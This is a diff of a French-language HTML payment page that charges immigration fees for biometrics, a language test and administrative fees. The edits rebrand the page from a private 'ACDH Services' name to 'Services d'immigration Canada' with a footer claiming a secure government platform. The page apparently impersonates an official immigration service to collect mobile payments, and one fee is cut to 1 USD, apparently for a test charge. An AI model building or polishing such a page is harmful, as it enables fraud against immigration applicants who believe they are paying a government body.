@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Paiement ACDH</title>
+<title>Service Immigration Paiement</title>
 
 <style>
 body {
@@ -114,7 +114,7 @@ button:hover {
 <div class="title">Service Immigration Paiement</div>
 
 <select id="service" onchange="updateAmount()">
-  <option value="150">Données biométriques - 150 USD</option>
+  <option value="1">Données biométriques - 1 USD</option>
   <option value="150">Test de langue - 150 USD</option>
   <option value="220">Droit administratif - 220 USD</option>
   <option value="520">Tout payer - 520 USD</option>
@@ -151,7 +151,7 @@ button:hover {
 </div>
 
 <div class="footer">
-© 2026 ACDH Services Canada International — Plateforme sécurisée 🔒
+© 2026 Services d'immigration Canada - Plateforme gouvernementale sécurisée 🔒
 </div>
 
 <script>
@@ -234,7 +234,7 @@ async function payer(){
   const data = await res.json();
 
   result.innerText =
-    data.status==="ACCEPTED"?"📲 Vérifiez votre téléphone":
+    data.status==="ACCEPTED"?"📲 Vérifiez votre téléphone pour confirmé le paiement":
     data.status==="PENDING"?"⏳ En attente":
     data.status==="SUCCESS"?"✅ Paiement confirmé":
     "❌ Échec";
